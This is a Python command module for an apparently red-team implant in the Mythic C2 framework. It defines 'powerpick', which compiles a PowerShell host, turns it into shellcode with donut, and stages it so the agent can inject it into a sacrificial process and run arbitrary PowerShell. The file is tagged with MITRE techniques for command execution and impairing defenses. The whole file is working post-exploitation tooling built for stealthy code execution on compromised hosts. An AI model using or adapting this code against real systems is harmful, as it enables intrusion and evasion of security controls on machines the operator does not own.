from distutils.dir_util import copy_tree
import shutil
import tempfile
from mythic_payloadtype_container.MythicCommandBase import *
import json
from sRDI import ShellcodeRDI
from uuid import uuid4
from mythic_payloadtype_container.MythicRPC import *
from os import path
import donut

POWERSHELL_HOST_PATH="/srv/PowerShellHost.exe"
POWERSHELL_FILE_ID=""

class PowerpickArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            # CommandParameter(
            #     name="powershell_params",
            #     cli_name="Command",
            #     display_name="Command",
            #     type=ParameterType.String,
            #     description="PowerShell command to execute.",
            # )
        ]

    async def parse_arguments(self):
        if len(self.command_line.strip()) == 0:
            raise Exception("A command must be passed on the command line to PowerPick.\n\tUsage: {}".format(PowerpickCommand.help_cmd))
        self.add_arg("powershell_params", self.command_line)
        self.add_arg("pipe_name", str(uuid4()))
        pass


class PowerpickCommand(CommandBase):
    cmd = "powerpick"
    needs_admin = False
    help_cmd = "powerpick [command]"
    description = "Inject PowerShell loader assembly into a sacrificial process and execute [command]."
    version = 2
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = PowerpickArguments
    attackmapping = ["T1059", "T1562"]
    
    async def build_powershell(self):
        global POWERSHELL_HOST_PATH
        agent_build_path = tempfile.TemporaryDirectory()
        outputPath = "{}/PowerShellHost/bin/Release/PowerShellHost.exe".format(agent_build_path.name)
            # shutil to copy payload files over
        copy_tree(self.agent_code_path, agent_build_path.name)
        shell_cmd = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release {}/PowerShellHost/PowerShellHost.csproj".format(agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build PowerShellHost.exe:\n{}".format(stderr.decode()))
        shutil.copy(outputPath, POWERSHELL_HOST_PATH)

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        global POWERSHELL_HOST_PATH 
        if not path.exists(POWERSHELL_HOST_PATH):
            await self.build_powershell()

        donutPic = donut.create(file=POWERSHELL_HOST_PATH, params=task.args.get_arg("pipe_name"))
        file_resp = await MythicRPC().execute("create_file",
                                              task_id=task.id,
                                              file=base64.b64encode(donutPic).decode(),
                                              delete_after_fetch=True)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
        else:
            raise Exception("Failed to register PowerShellHost.exe: " + file_resp.error)

        return task

    async def process_response(self, response: AgentResponse):
        pass
